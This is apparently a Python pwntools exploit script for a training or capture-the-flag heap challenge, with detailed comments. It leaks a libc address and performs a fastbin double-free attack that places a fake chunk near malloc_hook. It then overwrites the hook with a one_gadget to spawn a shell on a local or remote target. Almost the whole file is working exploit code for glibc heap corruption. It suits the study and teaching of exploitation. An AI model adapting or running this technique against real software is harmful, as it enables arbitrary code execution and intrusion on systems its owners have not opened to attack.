from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# notice that when you want to do the fastbin attack, you cannot free again an element which is already the top of the list, because
# there is a check about it. So, you need to free something in the middle: free(A),free(B),free(A).
# the biggest constraint in the fastbin attack is that the first byte of the fake chunk must be equal to the size of the bin.
# For this reason it is convenient to write in a parametric form, so if it is wrong we can change it.
# Notice that after overwrite the first chunk ( after the free mechanism) with the address that we want, we need to allocate
# three times (and not two as in the slides)

# malloc_hook and free_hook are two pointers in the bss of the libc.
# malloc_hook is checked inside the malloc function and if it is not null, then there is a call to this hook and return that value. Basically, this
# hook if it not null, it will replace the function malloc. by default is null.
# (i am not sure, but if you have done pnwinit, you should be able to see also these symbols) 
# p &__free_hook     -> 0x7ffff7dd37a8
# you can check them with: x/40gx 0x7ffff7dd37a8  
# another way to find the offsets for these pointers is to type in the terminal:
# objdump -d libc-2.27.so | grep "__free_hook" where 0x3c3ef8 should be the offset (but it's not precise, better to use the other method)

if "REMOTE" not in args:
    #ssh = ssh("acidburn", "192.168.56.104")
    #r = ssh.process("./fastbin_attack_patched")
    r = process("./fastbin_attack_patched")
    gdb.attach(r, """
	#b *0x00401255
	brva 0x0d37
	c
    """)
else:
    r = remote("bin.training.offdef.it", 10101)


def alloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    r.recvuntil(b"index ")
    return int(r.recvuntil(b"!")[:-1])

def alloc_nw(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    

def write_(index, data):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"Content: ")
    r.send(data)
    r.recvuntil(b"Done!\n")

def read_(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    return r.recvuntil(b"\nOptions:")[:-len(b"\nOptions:")]

def free(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"freed!\n")


#vmmap -> heap at x/10gx 0x555555759000
#p &main_arena  -> 0x7ffff7dd1b20
##LIBC LEAK
i = alloc(200)
alloc(10)
free(i)
print("check memory for LIBC LEAK")
# notice that you can retrieve the libc_base on gdb with vmmap
# and you can compute the difference with ipython 
libc_leak = u64(read_(i).ljust(8, b'\x00'))
libc_base = libc_leak - 0x3c4b78
print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)


## FAST BIN ATTACK
# this size is close to 0x7f which is the size that we will find before malloc_hook
SIZE = 0x68
i1 = alloc(SIZE)
i2 = alloc(SIZE)
#i3 = alloc(SIZE)
free(i1)
free(i2)
print("precycle")
free(i1)
print("check if there is a cycle")

t1 = alloc(SIZE)
free_hook = 0x3c67a8 + libc_base
print("free_hook: "+ hex(free_hook))
malloc_hook = 0x3c4b10 + libc_base
print("malloc_hook: "+ hex(malloc_hook))


# notice that there are 4 one_gadgets and the right one was the last one. In local also the first one worked.
# one-gadget --binary fastbin_attack
one_gadget = libc_base + 0xf1247
print("one_gadget: "+ hex(one_gadget))
# from gdb: p &main_arena
# vmmap -> base heap
print("main arena: " + hex(0x7ffff7dd1b20))
print("base heap: " +  hex(0x55555575a000))

# notice that before the malloc_hook there is always some address of stdin.
# there is a video about this. The idea is to get the "7f" which is written before malloc_hook and interpret it as 
# the size. But for doing this you need to disallaing the chunk and go back of 0x23.
# To see the new allignment, just type x/20gx address_malloc_hook -0x23 and the second address it will be 0x000000000000007f
target = p64(malloc_hook - 0x23)

alloc(SIZE)
print("before the write")
# with the follwoing write we are going to write in the chunk t1 and break the loop
write_(t1, target)
print("check the cycle is broken by the write")
alloc(SIZE)
print("important alloc. check memory")
target_index = alloc(SIZE)
# notice that this is an important malloc because we allocated at the address of the malloc hook -0x23, but the
# size is exactly the same to the one created with the previous write. 
# You need to remember that when you create a chunk. The chunk is all empty except for the size and the flags,
# 0x000000000000007f is the only thing that it will be written (the size is 0x68 while in the memory it will be 0x7f because the are also
# metadata and flags to count) because the rest will be empty. So, we don't break anything.
print("important write. check memory")
print("target_index: " +  str(target_index))
write_(target_index, b"A" * 0x13 + p64(one_gadget))
# b"A"*13 is the right padding to get the correct address in the exact position of the malloc_hook
alloc_nw(SIZE)	
# Finally, when you will call the new alloc, it will go directly to the function specified in the malloc_hook


r.interactive()

